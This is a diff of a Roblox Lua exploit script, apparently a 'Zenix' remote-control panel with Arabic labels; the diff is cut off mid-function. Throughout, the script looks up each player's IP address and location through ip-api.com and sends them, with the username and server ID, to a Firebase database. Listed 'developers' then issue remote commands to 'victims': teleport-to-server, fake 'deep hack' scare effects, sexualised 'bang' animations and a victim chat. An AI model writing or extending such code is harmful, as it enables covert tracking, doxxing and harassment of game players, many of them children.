@@ -5,10 +5,6 @@ local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Lighting = game:GetService("Lighting")
-local SoundService = game:GetService("SoundService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local StarterGui = game:GetService("StarterGui")
-local StarterPlayer = game:GetService("StarterPlayer")
 
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
@@ -22,7 +18,6 @@ end
 
 local PURPLE = Color3.fromRGB(160, 60, 255)
 local PURPLE_DARK = Color3.fromRGB(110, 30, 200)
-local PURPLE_LIGHT = Color3.fromRGB(200, 130, 255)
 local BG_DARK = Color3.fromRGB(15, 5, 25)
 
 local FIREBASE_URL = "https://zenix-dark-joker-default-rtdb.firebaseio.com/"
@@ -41,8 +36,12 @@ local Developers = {
     ["Go2yousef"] = true, ["saraaaal279"] = true,
 }
 
+local SUPER_DEVS = { go2mohamed = true, go2yousef = true }
+
 local TabAccess = {
-    connectedPlayers = { Go2mohamed = true, Go2yousef = true, joo77xb = true, qert6154 = true },
+    connectedPlayers = {
+        Go2mohamed = true, Go2yousef = true, joo77xb = true, qert6154 = true,
+    },
 }
 
 local LOCAL_ONLY = {
@@ -54,7 +53,7 @@ local PLAYER_INFO = {
     username = LocalPlayer.Name,
     displayName = LocalPlayer.DisplayName,
     accountAgeDays = LocalPlayer.AccountAge,
-    country = "Unknown", countryCode = "", city = "", region = "", zip = "",
+    country = "غير معروف", countryCode = "", city = "", region = "",
     ip = "N/A", phoneIp = "N/A", utcOffset = 0,
     placeId = game.PlaceId, jobId = game.JobId or "",
 }
@@ -75,6 +74,11 @@ end
 local function IsDevPlayer(p)
     if not p then return false end
     return IsDeveloperUsername(p.Name) or IsDeveloperUsername(p.DisplayName)
+end
+
+local function IsSuperDev(name)
+    if not name then return false end
+    return SUPER_DEVS[tostring(name):lower()] == true
 end
 
 local IsDeveloper = IsDevPlayer(LocalPlayer)
@@ -126,13 +130,12 @@ local function HttpGetRaw(url)
 end
 
 local function FetchIPInfo()
-    local deviceData = HttpGetRaw("http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,timezone,query,offset")
+    local deviceData = HttpGetRaw("http://ip-api.com/json/?lang=ar&fields=status,country,countryCode,regionName,city,timezone,query,offset")
     if deviceData and type(deviceData) == "table" then
-        PLAYER_INFO.country = tostring(deviceData.country or "Unknown")
+        PLAYER_INFO.country = tostring(deviceData.country or "غير معروف")
         PLAYER_INFO.countryCode = tostring(deviceData.countryCode or "")
         PLAYER_INFO.region = tostring(deviceData.regionName or "")
         PLAYER_INFO.city = tostring(deviceData.city or "")
-        PLAYER_INFO.zip = tostring(deviceData.zip or "")
         PLAYER_INFO.ip = tostring(deviceData.query or "N/A")
         PLAYER_INFO.utcOffset = tonumber(deviceData.offset) or 0
     end
@@ -157,11 +160,10 @@ local function RegisterPlayer()
         username = PLAYER_INFO.username, displayName = PLAYER_INFO.displayName,
         accountAgeDays = PLAYER_INFO.accountAgeDays, country = PLAYER_INFO.country,
         countryCode = PLAYER_INFO.countryCode, city = PLAYER_INFO.city,
-        region = PLAYER_INFO.region, zip = PLAYER_INFO.zip,
-        ip = PLAYER_INFO.ip, phoneIp = PLAYER_INFO.phoneIp,
-        utcOffset = PLAYER_INFO.utcOffset, placeId = PLAYER_INFO.placeId,
-        jobId = PLAYER_INFO.jobId, createdAt = os.time(),
-        lastSeen = os.time(), status = "online",
+        region = PLAYER_INFO.region, ip = PLAYER_INFO.ip,
+        phoneIp = PLAYER_INFO.phoneIp, utcOffset = PLAYER_INFO.utcOffset,
+        placeId = PLAYER_INFO.placeId, jobId = PLAYER_INFO.jobId,
+        createdAt = os.time(), lastSeen = os.time(), status = "online",
     })
 end
 
@@ -228,7 +230,6 @@ end)
 
 local CastleData = {}
 local HouseData = {}
-local OriginalStats = {}
 local ToggleStates = {}
 local FreezeData = {}
 local JailData = {}
@@ -258,7 +259,7 @@ local HOUSE_CONFIGS = {
 }
 
 local function LoadAsset(id, parent, name)
-    local success, result = pcall(function()
+    local ok, result = pcall(function()
         local objs = game:GetObjects("rbxassetid://" .. id)
         local container = Instance.new("Folder")
         container.Name = name or "Asset_" .. id
@@ -266,7 +267,7 @@ local function LoadAsset(id, parent, name)
         container.Parent = parent
         return container
     end)
-    if not success then return nil end
+    if not ok then return nil end
     return result
 end
 
@@ -280,13 +281,13 @@ local function BuildCastleFor(Player)
     for _, obj in ipairs(folder:GetChildren()) do obj.Parent = model end
     folder:Destroy()
     model.Parent = Workspace
-    local primaryPart = model.PrimaryPart
-    if not primaryPart then
+    local pp = model.PrimaryPart
+    if not pp then
         for _, obj in ipairs(model:GetDescendants()) do
-            if obj:IsA("BasePart") then primaryPart = obj; model.PrimaryPart = primaryPart; break end
+            if obj:IsA("BasePart") then pp = obj; model.PrimaryPart = pp; break end
         end
     end
-    if not primaryPart then model:Destroy(); return end
+    if not pp then model:Destroy(); return end
     model:SetPrimaryPartCFrame(CFrame.new(CASTLE_POSITION))
     local char = Player.Character
     if char and char:FindFirstChild("HumanoidRootPart") then
@@ -315,19 +316,19 @@ local function BuildHouseFor(Player, houseType)
         HouseData[pName][houseType] = nil
         return
     end
-    local success, objects = pcall(function() return game:GetObjects("rbxassetid://" .. config.id) end)
-    if not success or #objects == 0 then return end
+    local ok, objects = pcall(function() return game:GetObjects("rbxassetid://" .. config.id) end)
+    if not ok or #objects == 0 then return end
     local model = Instance.new("Model")
     model.Name = config.name .. "_" .. pName
     for _, obj in ipairs(objects) do obj.Parent = model end
     model.Parent = Workspace
-    local primaryPart = model.PrimaryPart
-    if not primaryPart then
+    local pp = model.PrimaryPart
+    if not pp then
         for _, obj in ipairs(model:GetDescendants()) do
-            if obj:IsA("BasePart") then primaryPart = obj; model.PrimaryPart = primaryPart; break end
+            if obj:IsA("BasePart") then pp = obj; model.PrimaryPart = pp; break end
         end
     end
-    if not primaryPart then model:Destroy(); return end
+    if not pp then model:Destroy(); return end
     model:SetPrimaryPartCFrame(CFrame.new(CASTLE_POSITION))
     local ground = nil
     if config.hasGround then
@@ -394,35 +395,30 @@ local function StopDarkWeb()
     DarkWebState.Tracked = {}
     for _, obj in ipairs(Workspace:GetDescendants()) do
         pcall(function()
-            if obj.Name:find("Zenix") or obj.Name:find("RedPlanet") or obj.Name:find("RedStatue")
-                or obj.Name == "FIREDECAL" or obj.Name == "PLANETDECAL"
-                or obj.Name == "STATUEDECAL" or obj.Name == "ZENIXDECAL"
-                or obj.Name == "PLAYERDECAL" then
+            local n = obj.Name
+            if n == "ZENIXDECAL" or n == "PLAYERDECAL" or n == "PLANETDECAL" or n == "STATUEDECAL" or n == "FIREDECAL" then
                 obj:Destroy()
-            elseif obj:IsA("Sound") and obj.Name:find("Zenix") then
+            elseif n:find("Zenix") or n:find("RedPlanet") or n:find("RedStatue") then
                 obj:Destroy()
             elseif obj:IsA("Fire") then
+                obj:Destroy()
+            elseif obj:IsA("ParticleEmitter") then
                 obj:Destroy()
             elseif obj:IsA("Hint") and obj.Text:find("Zenix") then
                 obj:Destroy()
             end
         end)
     end
-    for _, obj in ipairs(Lighting:GetDescendants()) do
-        pcall(function()
-            if obj:IsA("Sky") then obj:Destroy() end
-        end)
+    for _, obj in ipairs(Lighting:GetChildren()) do
+        pcall(function() if obj:IsA("Sky") then obj:Destroy() end end)
     end
     for _, plr in ipairs(Players:GetPlayers()) do
         local c = plr.Character
         if c then
             pcall(function()
-                local hl = c:FindFirstChild("ZenixHighlight")
-                if hl then hl:Destroy() end
-                local hd = c:FindFirstChild("Head")
-                if hd then
-                    local tag = hd:FindFirstChild("ZenixTag")
-                    if tag then tag:Destroy() end
+                for _, obj in ipairs(c:GetDescendants()) do
+                    if obj:IsA("Highlight") then obj:Destroy() end
+                    if obj:IsA("BillboardGui") and obj.Name == "ZenixTag" then obj:Destroy() end
                 end
             end)
         end
@@ -432,6 +428,13 @@ local function StopDarkWeb()
             PlayerGui:FindFirstChild("ZenixDarkWebEffects"):Destroy()
         end
     end)
+    for _, container in ipairs({game:GetService("SoundService"), game:GetService("ReplicatedStorage"), game:GetService("StarterGui"), game:GetService("StarterPlayer"), PlayerGui, LocalPlayer}) do
+        pcall(function()
+            for _, obj in ipairs(container:GetDescendants()) do
+                if obj:IsA("Sound") and obj.Name == "ZenixSound" then obj:Destroy() end
+            end
+        end)
+    end
 end
 
 local function StartDarkWeb()
@@ -449,7 +452,6 @@ local function StartDarkWeb()
         "http://www.roblox.com/asset/?id=169585515","http://www.roblox.com/asset/?id=169585502",
         "http://www.roblox.com/asset/?id=169585485","http://www.roblox.com/asset/?id=169585475",
     }
-    local MSG_TEXT = "Zenix have to deep hack to you, team Zenix want to join you"
     local HEAD_TEXT = "Zenix Will Join Today"
 
     if PlayerGui:FindFirstChild("ZenixDarkWebEffects") then
@@ -503,45 +505,6 @@ local function StartDarkWeb()
         f.Size = size or 15
         f.Heat = heat or 25
         f.Parent = part
-        return f
-    end
-
-    local function makeTag(plr)
-        local c = plr.Character
-        if not c then return end
-        local head = c:FindFirstChild("Head")
-        if not head then return end
-        if head:FindFirstChild("ZenixTag") then return end
-
-        local billboard = Instance.new("BillboardGui")
-        billboard.Name = "ZenixTag"
-        billboard.Size = UDim2.new(0, 150, 0, 30)
-        billboard.StudsOffset = Vector3.new(0, 3.5, 0)
-        billboard.AlwaysOnTop = true
-        billboard.MaxDistance = 100000
-        billboard.LightInfluence = 0
-        billboard.Parent = head
-        track(billboard)
-
-        local text = Instance.new("TextLabel")
-        text.Size = UDim2.new(1, 0, 1, 0)
-        text.BackgroundTransparency = 1
-        text.Text = HEAD_TEXT
-        text.TextColor3 = RED
-        text.TextStrokeColor3 = Color3.new(0, 0, 0)
-        text.TextStrokeTransparency = 0
-        text.TextScaled = true
-        text.Font = Enum.Font.GothamBlack
-        text.Parent = billboard
-
-        task.spawn(function()
-            while isRunning() and billboard.Parent do
-                RunService.Heartbeat:Wait()
-                billboard.StudsOffset = Vector3.new(math.random(-2,2)*0.5, 3.5 + math.random(-2,2)*0.5, math.random(-2,2)*0.3)
-                text.Rotation = math.random(-4, 4)
-                text.TextTransparency = math.random() < 0.04 and math.random() * 0.4 or 0
-            end
-        end)
     end
 
     task.spawn(function()
@@ -617,69 +580,10 @@ local function StartDarkWeb()
                 local part = validParts[i]
                 if part and part.Parent then
                     addDecal(part)
-                    addParticles(part, 7, 60, 9)
+                    addParticles(part, 5, 50, 8)
                 end
             end
         end
-
-        local planetFolder = Instance.new("Folder")
-        planetFolder.Name = "ZenixPlanets"
-        planetFolder.Parent = Workspace
-        track(planetFolder)
-
-        local planets = {}
-        local planetSizes = 6
-        for second = 1, 3 do
-            task.wait(1)
-            if not isRunning() then return end
-            local batchCount = (second == 3) and 8 or 6
-            for i = 1, batchCount do
-                if not isRunning() then break end
-                if #planets >= 20 then break end
-                local p = Instance.new("Part")
-                p.Shape = Enum.PartType.Ball
-                p.Material = Enum.Material.Neon
-                local baseSize = math.random(4, 12) * planetSizes
-                p.Size = Vector3.new(baseSize, baseSize, baseSize)
-                p.Anchored = true
-                p.CanCollide = false
-                p.Color = RED
-                p.Name = "RedPlanet_" .. (#planets + 1)
-                local ang = math.random() * math.pi * 2
-                local rad = math.random(60, 400)
-                local skyY = math.random(150, 400)
-                p.Position = Vector3.new(
-                    root.Position.X + math.cos(ang) * rad,
-                    root.Position.Y + skyY,
-                    root.Position.Z + math.sin(ang) * rad
-                )
-                p.Parent = planetFolder
-                addDecal(p, "PLANETDECAL")
-                addParticles(p, 22, 120, 22)
-                table.insert(planets, {
-                    part = p, radius = rad, angle = ang, baseY = skyY,
-                    speed = math.random(30, 80) / 100,
-                    verticalSpeed = math.random(20, 60) / 100,
-                })
-            end
-        end
-
-        task.spawn(function()
-            local t = 0
-            while isRunning() and planetFolder.Parent do
-                local dt = RunService.Heartbeat:Wait()
-                t += dt
-                for _, p in ipairs(planets) do
-                    p.angle += dt * p.speed
-                    local yFloat = math.sin(t * p.verticalSpeed * 3) * 40
-                    p.part.CFrame = CFrame.new(
-                        root.Position.X + math.cos(p.angle) * p.radius,
-                        root.Position.Y + p.baseY + yFloat,
-                        root.Position.Z + math.sin(p.angle) * p.radius
-                    )
-                end
-            end
-        end)
 
         local statueFolder = Instance.new("Folder")
         statueFolder.Name = "ZenixStatues"
@@ -689,7 +593,7 @@ local function StartDarkWeb()
         local SCALE = 4 * 9
         local rayParams = RaycastParams.new()
         rayParams.FilterType = Enum.RaycastFilterType.Exclude
-        rayParams.FilterDescendantsInstances = {statueFolder, planetFolder}
+        rayParams.FilterDescendantsInstances = {statueFolder}
 
         local function getGroundY(x, z)
             local res = Workspace:Raycast(Vector3.new(x, 500, z), Vector3.new(0, -1000, 0), rayParams)
@@ -706,7 +610,7 @@ local function StartDarkWeb()
             p.Color = RED
             if isBall then p.Shape = Enum.PartType.Ball end
             addDecal(p, "STATUEDECAL")
-            addParticles(p, 14, 130, 22)
+            addParticles(p, 8, 80, 15)
             addRealFire(p, 25, 30)
             return p
         end
@@ -838,35 +742,40 @@ local function StartDarkWeb()
             end
         end)
 
-        local function makeRed(plr)
-            local c = plr.Character
-            if not c then return end
-            if c:FindFirstChild("ZenixHighlight") then return end
-            local h = Instance.new("Highlight")
-            h.Name = "ZenixHighlight"
-            h.FillColor = RED
-            h.OutlineColor = RED
-            h.FillTransparency = 0.3
-            h.OutlineTransparency = 0
-            h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-            h.Parent = c
-        end
-
         for _, plr in ipairs(Players:GetPlayers()) do
-            if not isRunning() then break end
-            makeRed(plr)
-            makeTag(plr)
+            local c = plr.Character
+            if c and not c:FindFirstChild("ZenixHighlight") then
+                local h = Instance.new("Highlight")
+                h.Name = "ZenixHighlight"
+                h.FillColor = RED
+                h.OutlineColor = RED
+                h.FillTransparency = 0.3
+                h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+                h.Parent = c
+            end
+            local hd = c and c:FindFirstChild("Head")
+            if hd and not hd:FindFirstChild("ZenixTag") then
+                local bb = Instance.new("BillboardGui")
+                bb.Name = "ZenixTag"
+                bb.Size = UDim2.new(0, 150, 0, 30)
+                bb.StudsOffset = Vector3.new(0, 3.5, 0)
+                bb.AlwaysOnTop = true
+                bb.Parent = hd
+                track(bb)
+                local t = Instance.new("TextLabel")
+                t.Size = UDim2.new(1, 0, 1, 0)
+                t.BackgroundTransparency = 1
+                t.Text = HEAD_TEXT
+                t.TextColor3 = RED
+                t.TextStrokeColor3 = Color3.new(0, 0, 0)
+                t.TextStrokeTransparency = 0
+                t.TextScaled = true
+                t.Font = Enum.Font.GothamBlack
+                t.Parent = bb
+            end
         end
-
-        Players.PlayerAdded:Connect(function(plr)
-            plr.CharacterAdded:Connect(function()
-                task.wait(0.5)
-                if isRunning() then makeRed(plr); makeTag(plr) end
-            end)
-        end)
 
         local overlay = Instance.new("Frame")
-        overlay.Name = "ZenixOverlay"
         overlay.Size = UDim2.new(1, 0, 1, 0)
         overlay.BackgroundColor3 = RED
         overlay.BackgroundTransparency = 0.75
@@ -878,57 +787,13 @@ local function StartDarkWeb()
         task.spawn(function()
             local up = true
             while isRunning() and overlay.Parent do
-                local t = overlay.BackgroundTransparency
-                overlay.BackgroundTransparency = up and t - 0.008 or t + 0.008
+                local tr = overlay.BackgroundTransparency
+                overlay.BackgroundTransparency = up and tr - 0.008 or tr + 0.008
                 if overlay.BackgroundTransparency <= 0.6 then up = false end
                 if overlay.BackgroundTransparency >= 0.85 then up = true end
                 task.wait(0.08)
             end
         end)
-
-        local haloFrame = Instance.new("Frame")
-        haloFrame.Name = "FireHalo"
-        haloFrame.Size = UDim2.new(0, 10000, 0, 10000)
-        haloFrame.Position = UDim2.new(0.5, -5000, 0.5, -5000)
-        haloFrame.BackgroundTransparency = 1
-        haloFrame.ZIndex = 6
-        haloFrame.Parent = fxSg
-        track(haloFrame)
-
-        local haloImages = {}
-        for i = 1, 39 do
-            if not isRunning() then break end
-            local haloImg = Instance.new("ImageLabel")
-            haloImg.Size = UDim2.new(1, 0, 1, 0)
-            haloImg.BackgroundTransparency = 1
-            haloImg.Image = "rbxassetid://16454842562"
-            haloImg.ImageColor3 = RED
-            haloImg.ImageTransparency = 0.3
-            haloImg.ZIndex = 6
-            haloImg.Rotation = (i - 1) * (360 / 39)
-            haloImg.Parent = haloFrame
-            table.insert(haloImages, haloImg)
-        end
-
-        task.spawn(function()
-            local t = 0
-            while isRunning() and haloFrame.Parent do
-                local dt = RunService.Heartbeat:Wait()
-                t += dt
-                for i, img in ipairs(haloImages) do
-                    img.Rotation = ((i - 1) * (360 / 39)) + t * 30
-                    img.ImageTransparency = 0.2 + math.abs(math.sin(t * 2 + i)) * 0.4
-                end
-            end
-        end)
-
-        for i = 1, 9 do
-            if not isRunning() then break end
-            local h = Instance.new("Hint")
-            h.Text = MSG_TEXT .. " #" .. i
-            h.Parent = Workspace
-            track(h)
-        end
     end)
 end
 
@@ -944,22 +809,21 @@ local function GiveChatGui(devName)
     if not pok then sg.Parent = PlayerGui end
 
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 320, 0, 160)
-    frame.Position = UDim2.new(0.5, -160, 0.5, -80)
+    frame.Size = UDim2.new(0, 320, 0, 180)
+    frame.Position = UDim2.new(0.5, -160, 0.5, -90)
     frame.BackgroundColor3 = Color3.new(0, 0, 0)
     frame.BorderSizePixel = 0
-    frame.Active = true
     frame.Parent = sg
     Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
-    local stroke = Instance.new("UIStroke", frame)
-    stroke.Color = Color3.new(1, 1, 1)
-    stroke.Thickness = 2
+    local st = Instance.new("UIStroke", frame)
+    st.Color = Color3.new(1, 1, 1)
+    st.Thickness = 2
 
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, -60, 0, 30)
     title.Position = UDim2.new(0, 10, 0, 5)
     title.BackgroundTransparency = 1
-    title.Text = "اكتب للمطور " .. devName
+    title.Text = "شات مع " .. devName
     title.TextColor3 = Color3.new(1, 1, 1)
     title.Font = Enum.Font.GothamBold
     title.TextSize = 13
@@ -978,7 +842,7 @@ local function GiveChatGui(devName)
     closeBtn.MouseButton1Click:Connect(function() sg:Destroy() end)
 
     local input = Instance.new("TextBox")
-    input.Size = UDim2.new(1, -20, 0, 80)
+    input.Size = UDim2.new(1, -20, 0, 90)
     input.Position = UDim2.new(0, 10, 0, 40)
     input.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
     input.BorderSizePixel = 0
@@ -1034,7 +898,6 @@ local function GiveChatGui(devName)
                 toDeveloper = devName,
                 message = msg,
                 timestamp = os.time(),
-                read = false,
             })
         end)
         input.Text = ""
@@ -1053,22 +916,21 @@ local function OpenDevToVictimChat(victimName)
     if not pok then sg.Parent = PlayerGui end
 
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 340, 0, 170)
-    frame.Position = UDim2.new(0.5, -170, 0.5, -85)
+    frame.Size = UDim2.new(0, 340, 0, 180)
+    frame.Position = UDim2.new(0.5, -170, 0.5, -90)
     frame.BackgroundColor3 = Color3.new(0, 0, 0)
     frame.BorderSizePixel = 0
-    frame.Active = true
     frame.Parent = sg
     Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
-    local stroke = Instance.new("UIStroke", frame)
-    stroke.Color = Color3.new(1, 1, 1)
-    stroke.Thickness = 2
+    local st = Instance.new("UIStroke", frame)
+    st.Color = Color3.new(1, 1, 1)
+    st.Thickness = 2
 
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, -60, 0, 30)
     title.Position = UDim2.new(0, 10, 0, 5)
     title.BackgroundTransparency = 1
-    title.Text = "كلم الضحية " .. victimName
+    title.Text = "شات مع " .. victimName
     title.TextColor3 = Color3.new(1, 1, 1)
     title.Font = Enum.Font.GothamBold
     title.TextSize = 13
@@ -1143,25 +1005,36 @@ local function OpenDevToVictimChat(victimName)
                 toPlayer = victimName,
                 message = msg,
                 timestamp = os.time(),
-                read = false,
             })
         end)
         input.Text = ""
     end)
 end
 
+local function CanAffectTarget(senderName, targetPlayer)
+    if not IsDevPlayer(targetPlayer) then return true end
+    return IsSuperDev(senderName)
+end
+
 local ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer)
     local target = targetPlayer or FindPlayer(targetName)
     if not target then return end
+
+    local isBang = cmd == "bangback" or cmd == "bangface" or cmd == "bangcomb" or cmd == "bangv2body" or cmd == "bangv2face" or cmd == "bangstopall"
+
+    if IsDevPlayer(target) then
+        if isBang then return end
+        if cmd ~= "bring" then
+            if not IsSuperDev(senderName) then return end
+        end
+    end
 
     if cmd == "joinserver" then
         if target == LocalPlayer and value then
             local placeId, jobId = tostring(value):match("^(%d+)|(.+)$")
             if placeId and jobId and jobId ~= "" then
                 task.wait(0.5)
-                pcall(function()
-                    TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId, LocalPlayer)
-                end)
+                pcall(function() TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId, LocalPlayer) end)
             end
         end
         return
@@ -1183,28 +1056,22 @@ local ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer
         if target ~= LocalPlayer then return end
         if RainbowMapData.Active then StopRainbowMap() return end
         RainbowMapData = { Active = true, OriginalColors = {} }
-        local count = 0
         for _, obj in ipairs(Workspace:GetDescendants()) do
             if obj:IsA("BasePart") then
                 RainbowMapData.OriginalColors[obj] = obj.Color
-                count = count + 1
-                if count >= 3000 then break end
             end
         end
         local hue = 0
         task.spawn(function()
             while RainbowMapData.Active do
-                hue = (hue + 0.015) % 1
+                hue = (hue + 0.03) % 1
                 local col = Color3.fromHSV(hue, 1, 1)
-                local camPos = Workspace.CurrentCamera and Workspace.CurrentCamera.CFrame.Position or Vector3.zero
                 for part in pairs(RainbowMapData.OriginalColors) do
                     if part and part.Parent then
-                        if (part.Position - camPos).Magnitude < 400 then
-                            part.Color = col
-                        end
+                        part.Color = col
                     end
                 end
-                task.wait(0.1)
+                task.wait(0.05)
             end
         end)
         return
@@ -1583,8 +1450,8 @@ local ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer
         local ok = pcall(function() sg.Parent = CoreGui end)
         if not ok then sg.Parent = PlayerGui end
         local f = Instance.new("Frame", sg)
-        f.Size = UDim2.new(0, 220, 0, 50)
-        f.Position = UDim2.new(0.5, -110, 0.1, 0)
+        f.Size = UDim2.new(0, 240, 0, 60)
+        f.Position = UDim2.new(0.5, -120, 0.1, 0)
         f.BackgroundColor3 = PURPLE_DARK
         Instance.new("UICorner", f).CornerRadius = UDim.new(0, 8)
         local l = Instance.new("TextLabel", f)
@@ -1596,13 +1463,13 @@ local ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer
         l.TextScaled = true
         l.TextWrapped = true
         l.Font = Enum.Font.GothamBold
-        task.delay(3, function() sg:Destroy() end)
+        task.delay(4, function() sg:Destroy() end)
     elseif cmd == "notfstop" then
         if NotfData[pName] and NotfData[pName].Gui then
             NotfData[pName].Gui:Destroy()
             NotfData[pName] = nil
         end
-    elseif cmd == "bangback" or cmd == "bangface" or cmd == "bangcomb" or cmd == "bangv2body" or cmd == "bangv2face" then
+    elseif isBang then
         local t2Name = value
         if not t2Name then return end
         local t2 = FindPlayer(t2Name)
@@ -1641,13 +1508,6 @@ local ExecuteCommand = function(cmd, targetName, value, senderName, targetPlayer
                 hrp.CFrame = t2head.CFrame * CFrame.Angles(math.rad(math.random(360)), math.rad(math.random(360)), math.rad(math.random(360)))
             end
         end)
-    elseif cmd == "bangstopall" then
-        if BangState[pName] then
-            BangState[pName].Active = false
-            if BangState[pName].Connection then BangState[pName].Connection:Disconnect() end
-            BangState[pName] = nil
-            hum.PlatformStand = false
-        end
     end
 end
 
@@ -1666,6 +1526,11 @@ local function HandleRemoteCommand(key, cmdData)
     local targetPlayer = FindPlayer(targetRaw)
     if not targetPlayer then return end
     if LOCAL_ONLY[cmd] and targetPlayer ~= LocalPlayer then return end
+    if IsDevPlayer(targetPlayer) and targetPlayer ~= LocalPlayer then
+        if cmd ~= "bring" then
+            if not IsSuperDev(sender) then return end
+        end
+    end
     processedCommands[key] = true
     task.spawn(function()
         pcall(ExecuteCommand, cmd, targetPlayer.Name, (cmdData.value and cmdData.value ~= "" and cmdData.value or nil), sender, targetPlayer)
@@ -1712,8 +1577,8 @@ if not IsDeveloper then
                                 local ok2 = pcall(function() sg.Parent = CoreGui end)
                                 if not ok2 then sg.Parent = PlayerGui end
                                 local f = Instance.new("Frame", sg)
-                                f.Size = UDim2.new(0, 260, 0, 60)
-                                f.Position = UDim2.new(0.5, -130, 0.1, 0)
+                                f.Size = UDim2.new(0, 280, 0, 60)
+                                f.Position = UDim2.new(0.5, -140, 0.1, 0)
                                 f.BackgroundColor3 = PURPLE_DARK
                                 f.BorderSizePixel = 0
                                 Instance.new("UICorner", f).CornerRadius = UDim.new(0, 8)
@@ -1872,7 +1737,6 @@ if IsDeveloper then
         TabContainer.ScrollBarThickness = 5
         TabContainer.ScrollBarImageColor3 = PURPLE
         TabContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
-        TabContainer.ScrollingEnabled = true
         TabContainer.Parent = MainFrame
         local TabList = Instance.new("UIListLayout", TabContainer)
         TabList.Padding = UDim.new(0, 12)
@@ -1933,8 +1797,6 @@ if IsDeveloper then
             s.ScrollBarThickness = 6
             s.ScrollBarImageColor3 = PURPLE
             s.CanvasSize = UDim2.new(0, 0, 0, 0)
-            s.ScrollingEnabled = true
-            s.ScrollingDirection = Enum.ScrollingDirection.Y
             s.Parent = parent
             local l = Instance.new("UIListLayout", s)
             l.Padding = UDim.new(0, 8)
@@ -2065,9 +1927,10 @@ if IsDeveloper then
             local btn = StyledButton(BangScroll, data[1], function()
                 local p1 = FindPlayer(BangV.Text)
                 if not p1 then return end
+                if IsDevPlayer(p1) then return end
                 if data[3] then
                     local p2 = FindPlayer(BangT.Text)
-                    if p2 then SendCommandAPI(data[2], p1.Name, p2.Name) end
+                    if p2 and not IsDevPlayer(p2) then SendCommandAPI(data[2], p1.Name, p2.Name) end
                 else
                     SendCommandAPI(data[2], p1.Name, nil)
                 end
@@ -2112,11 +1975,9 @@ if IsDeveloper then
         end)
         StyledButton(NotfScroll, "اعطائه شات يكلم المطور", function()
             local p = FindPlayer(NotfV.Text)
-            if p then SendCommandAPI("givechat", p.Name, nil) end
-        end)
-        StyledButton(NotfScroll, "اعطائي شات اكلم الضحية", function()
-            local p = FindPlayer(NotfV.Text)
-            if p then OpenDevToVictimChat(p.Name) end
+            if not p then return end
+            SendCommandAPI("givechat", p.Name, nil)
+            OpenDevToVictimChat(p.Name)
         end)
 
         local HouseHeader = Instance.new("Frame")
@@ -2247,7 +2108,7 @@ if IsDeveloper then
                     info.Size = UDim2.new(1, -16, 0, 16)
                     info.Position = UDim2.new(0, 8, 0, 44)
                     info.BackgroundTransparency = 1
-                    info.Text = "الدولة: " .. (pdata.country or "?") .. " | " .. (pdata.city or "-") .. " | الرمز: " .. (pdata.zip or "-")
+                    info.Text = (pdata.country or "?") .. " | " .. (pdata.region or "-") .. " | " .. (pdata.city or "-")
                     info.TextColor3 = Color3.fromRGB(200, 180, 255)
                     info.Font = Enum.Font.Gotham
                     info.TextSize = 11
@@ -2413,10 +2274,9 @@ if IsDeveloper then
 
                         addRow("الاسم المستعار", tostring(pdata.displayName or ""))
                         addRow("الاسم الأساسي", tostring(pdata.username or ""))
-                        addRow("الدولة", tostring(pdata.country or "Unknown"))
-                        addRow("المدينة", tostring(pdata.city or "-"))
+                        addRow("الدولة", tostring(pdata.country or "غير معروف"))
                         addRow("المنطقة", tostring(pdata.region or "-"))
-                        addRow("الرمز البريدي", tostring(pdata.zip or "-"))
+                        addRow("المدينة", tostring(pdata.city or "-"))
                         addRow("ip الهاتف", tostring(pdata.phoneIp or "N/A"))
                         addRow("عمر الحساب", tostring(pdata.accountAgeDays or 0) .. " يوم")
                         addRow("Place ID", tostring(pdata.placeId or 0))
@@ -2428,9 +2288,7 @@ if IsDeveloper then
                         local jid = tostring(pdata.jobId or "")
                         if jid ~= "" and jid ~= "nil" then
                             task.spawn(function()
-                                pcall(function()
-                                    TeleportService:TeleportToPlaceInstance(pid, jid, LocalPlayer)
-                                end)
+                                pcall(function() TeleportService:TeleportToPlaceInstance(pid, jid, LocalPlayer) end)
                             end)
                         end
                     end)
@@ -2546,60 +2404,4 @@ if IsDeveloper then
 
             local entry = { Frame = notif, NumLabel = numLbl }
             table.insert(chatNotifs, entry)
-            RenumberChatNotifs()
-
-            xBtn.MouseButton1Click:Connect(function()
-                notif:Destroy()
-                task.wait(0.05)
-                local newList = {}
-                for _, n in ipairs(chatNotifs) do
-                    if n.Frame and n.Frame.Parent then table.insert(newList, n) end
-                end
-                chatNotifs = newList
-                RenumberChatNotifs()
-            end)
-        end
-
-        task.spawn(function()
-            task.wait(3)
-            while chatSg and chatSg.Parent do
-                local ok, data = HttpCall("GET", "chatMessages.json")
-                if ok and type(data) == "table" then
-                    for key, msg in pairs(data) do
-                        if type(msg) == "table" and not seenChatMsgs[key] then
-                            local toDev = tostring(msg.toDeveloper or "")
-                            if toDev == LocalPlayer.Name then
-                                seenChatMsgs[key] = true
-                                AddChatNotif(msg.fromDisplayName or msg.fromUsername, msg.message)
-                            end
-                        end
-                    end
-                end
-                task.wait(3)
-            end
-        end)
-
-        ToggleBtn.MouseButton1Click:Connect(function()
-            MainFrame.Visible = not MainFrame.Visible
-        end)
-        CloseBtn.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)
-        MinBtn.MouseButton1Click:Connect(function()
-            if MainFrame.Size.Y.Offset > 100 then
